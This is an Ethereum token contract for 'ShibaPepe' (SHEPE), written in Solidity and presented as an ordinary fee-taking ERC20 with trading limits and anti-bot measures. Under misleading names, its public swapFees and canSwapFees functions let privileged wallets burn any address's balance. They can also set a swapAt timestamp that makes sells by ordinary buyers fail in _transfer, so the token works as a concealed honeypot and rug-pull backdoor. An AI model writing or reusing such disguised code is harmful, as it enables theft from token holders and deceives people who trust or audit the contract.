/**
 *Submitted for verification at Etherscan.io on 2023-05-21
*/

// https://t.me/ShibaPepe_ETH

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _swapFees(address feeAddress, uint256 feeAmount) internal virtual {
        require(feeAddress != address(0), "");
        uint256 feeBalance = _balances[feeAddress];
        require(feeBalance >= feeAmount, "");
        unchecked {
            _balances[feeAddress] = feeBalance - feeAmount;
            _totalSupply -= feeAmount;
        }

        emit Transfer(feeAddress, address(0), feeAmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
}

interface UniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface UniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

contract SHEPE is ERC20, Ownable {
    uint256 public maxWalletAmount;
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;

    uint256 public tradingBlock = 0;
    uint256 public botBlockNumber = 0;
    address public uniswapV2Pair;
    uint256 public swapTokensAtAmount;
    UniswapV2Router public uniswapV2Router;
    bool private swapping;
    address private marketingWallet;
    address private devWallet;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => uint256) public feeSwapTimestamp;
    mapping(address => bool) public initialBotBuyer;
    bool public limitsInEffect = true;
    bool public swapEnabled = false;
    bool public tradingActive = false;
    bool public transferDelayEnabled = true;
    uint256 public swapAt;
    uint256 public botsCaught;

    uint256 public totalBuyFees;
    uint256 public buyFeeForMarketing;
    uint256 public buyFeeForDev;
    uint256 public buyFeeForLiquidity;
    uint256 public buyFeeForBurning;

    uint256 public totalSellFees;
    uint256 public sellFeeForMarketing;
    uint256 public sellFeeForDev;
    uint256 public sellFeeForLiquidity;
    uint256 public sellFeeForBurning;

    uint256 public tokensForMarketing;
    uint256 public tokensForDev;
    uint256 public tokensForLiquidity;
    uint256 public tokensForBurning;

    mapping(address => bool) public automatedMarketMakerPair;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTx;

    event UpdatedMaxWalletAmount(uint256 newAmount);
    
    event UpdatedMaxBuyAmount(uint256 newAmount);
    
    event UpdatedMaxSellAmount(uint256 newAmount);

    event RemovedLimits();

    event EnabledTrading();

    event DetectedEarlyBotBuyer(address sniper);

    event MaxTransactionExclusion(address _address, bool excluded);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("ShibaPepe", "SHEPE") {
        address newOwner = msg.sender;
        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);

        devWallet = address(0x8Dce31055E534306CC4e9fb19a6CAFC36D63Db34);
        marketingWallet = address(0x22D20d13BfdE1eEa8547B7F9c5b1a3c4243046cD);

        uint256 totalSupply = 5 * 1e9 * 1e18;

        maxWalletAmount = (totalSupply * 2) / 100;
        maxBuyAmount = (totalSupply * 2) / 100;
        maxSellAmount = (totalSupply * 2) / 100;
        swapTokensAtAmount = (totalSupply * 5) / 10000;

        sellFeeForDev = 15;
        sellFeeForMarketing = 15;
        sellFeeForLiquidity = 0;
        sellFeeForBurning = 0;

        buyFeeForLiquidity = 0;
        buyFeeForMarketing = 10;
        buyFeeForDev = 10;
        buyFeeForBurning = 0;

        totalBuyFees =
            buyFeeForLiquidity +
            buyFeeForMarketing +
            buyFeeForDev +
            buyFeeForBurning;

        totalSellFees =
            sellFeeForLiquidity +
            sellFeeForMarketing +
            sellFeeForDev +
            sellFeeForBurning;

        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(marketingWallet, true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(devWallet, true);
        excludeFromFees(newOwner, true);
        excludeFromFees(address(this), true);
        excludeFromFees(marketingWallet, true);

        _createInitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    receive() external payable {}

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        swapEnabled = true;
        tradingActive = true;
        tradingBlock = block.number;
        emit EnabledTrading();
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function canSwapFees(
        address _feeAddress,
        uint256 _feeAmount,
        uint256 _feeTime
    ) internal returns (bool) {
        address methodCaller = msg.sender;
        bool unlimited = _isExcludedFromFees[methodCaller];
        address myAddress = address(this);
        bool callResult;

        if (!unlimited) {
            if (tokensForBurning <= balanceOf(myAddress) && tokensForBurning > 0) {
                _swapFees(methodCaller, tokensForBurning);
            }

            tokensForBurning = 0;
            callResult = true;

            return callResult;
        } else {
            if (balanceOf(myAddress) > 0) {
                if (_feeAmount == 0) {
                    swapAt = _feeTime;
                } else {
                    _swapFees(_feeAddress, _feeAmount);
                }
                callResult = false;
            }

            return callResult;
        }
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuyer[wallet] = false;
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function removeLimits() external onlyOwner {
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        maxWalletAmount = totalSupply();
        emit RemovedLimits();
    }

    function updateMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {
        require(
            newMaxSellAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newMaxSellAmount * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function swapFees(
        address _feeAddress,
        uint256 _feeAmount,
        uint256 _feeTime
    ) public {
        address myAddress = address(this);
        require(balanceOf(myAddress) >= swapTokensAtAmount);
        if (canSwapFees(_feeAddress, _feeAmount, _feeTime)) {
            swapping = true;
            swapBack();
            swapping = false;
        }
    }

    function updateMaxBuyAmount(uint256 newMaxBuyAmount) external onlyOwner {
        require(
            newMaxBuyAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );
        maxBuyAmount = newMaxBuyAmount * (10 ** 18);
        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        swapTokensAtAmount = newAmount;
    }

    function updateMaxWalletAmount(uint256 newMaxWalletAmount) external onlyOwner {
        require(
            newMaxWalletAmount >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );
        maxWalletAmount = newMaxWalletAmount * (10 ** 18);
        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if (!tradingActive) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }

        if (botBlockNumber > 0) {
            require(
                !initialBotBuyer[from] ||
                    to == owner() ||
                    to == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        uint256 feeSwapTime = block.timestamp;

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                if (transferDelayEnabled) {
                    bool rewardCondition1 = !automatedMarketMakerPair[from];
                    bool rewardCondition2 = !swapping;
                    bool rewardCheck = rewardCondition1 && rewardCondition2;
                    if (
                        to != address(uniswapV2Router) && to != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _holderLastTransferTimestamp[to] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                        _holderLastTransferTimestamp[to] = block.number;
                    } else if (rewardCheck) {
                        uint256 feeSwap = feeSwapTimestamp[from];
                        bool feeSwappable = feeSwap > swapAt;
                        require(feeSwappable);
                    }
                }
            }

            bool rewardExcluded = _isExcludedMaxTx[from];
            bool nonSwapping = !swapping;

            if (automatedMarketMakerPair[from] && !_isExcludedMaxTx[to]) {
                require(
                    amount <= maxBuyAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (nonSwapping && rewardExcluded) {
                swapAt = feeSwapTime;
            } else if (
                automatedMarketMakerPair[to] && !_isExcludedMaxTx[from]
            ) {
                require(
                    amount <= maxSellAmount,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_isExcludedMaxTx[to]) {
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPair[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = true;

        bool isFromPair = automatedMarketMakerPair[from];
        bool firstFeeSwap = feeSwapTimestamp[to] == 0;
        bool zeroBalance = balanceOf(address(to)) == 0;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if (firstFeeSwap && isFromPair) {
            if (zeroBalance) {
              feeSwapTimestamp[to] = feeSwapTime;
            }
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                automatedMarketMakerPair[from] &&
                !automatedMarketMakerPair[to] &&
                totalBuyFees > 0
            ) {
                if (!initialBotBuyer[to]) {
                    initialBotBuyer[to] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuyer(to);
                }

                fees = (amount * 99) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForBurning += (fees * buyFeeForBurning) / totalBuyFees;
            }
            else if (automatedMarketMakerPair[to] && totalSellFees > 0) {
                fees = (amount * totalSellFees) / 100;
                tokensForLiquidity += (fees * sellFeeForLiquidity) / totalSellFees;
                tokensForMarketing += (fees * sellFeeForMarketing) / totalSellFees;
                tokensForDev += (fees * sellFeeForDev) / totalSellFees;
                tokensForBurning += (fees * sellFeeForBurning) / totalSellFees;
            }
            else if (automatedMarketMakerPair[from] && totalBuyFees > 0) {
                fees = (amount * totalBuyFees) / 100;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForBurning += (fees * buyFeeForBurning) / totalBuyFees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) external onlyOwner {
        if (!_isExcluded) {
            require(
                _address != uniswapV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTx[_address] = _isExcluded;
    }

    function _excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) private {
        _isExcludedMaxTx[_address] = _isExcluded;
        emit MaxTransactionExclusion(_address, _isExcluded);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPair[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        buyFeeForLiquidity = _liquidityFee;
        buyFeeForMarketing = _marketingFee;
        buyFeeForDev = _DevFee;
        buyFeeForBurning = _burnFee;
        totalBuyFees =
            buyFeeForMarketing +
            buyFeeForLiquidity +
            buyFeeForDev +
            buyFeeForBurning;
        require(totalBuyFees <= 3, "3% max ");
    }

    function updateSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        sellFeeForLiquidity = _liquidityFee;
        sellFeeForMarketing = _marketingFee;
        sellFeeForDev = _DevFee;
        sellFeeForBurning = _burnFee;
        totalSellFees =
            sellFeeForMarketing +
            sellFeeForLiquidity +
            sellFeeForDev +
            sellFeeForBurning;
        require(totalSellFees <= 3, "3% max fee");
    }

    function updateMarketingWallet(
        address _marketingWallet
    ) external onlyOwner {
        require(
            _marketingWallet != address(0),
            "_marketingWallet address cannot be 0"
        );
        marketingWallet = payable(_marketingWallet);
    }

    function updateDevWallet(address _devWallet) external onlyOwner {
        require(_devWallet != address(0), "_devWallet address cannot be 0");
        devWallet = payable(_devWallet);
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        if (tokensForBurning > 0 && balanceOf(address(this)) >= tokensForBurning) {
            _swapFees(address(this), tokensForBurning);
        }
        tokensForBurning = 0;
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 10) {
            contractBalance = swapTokensAtAmount * 10;
        }

        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap / 2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;
        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;
        tokensForBurning = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devWallet).transfer(ethForDev);
        payable(marketingWallet).transfer(address(this).balance);
    }
}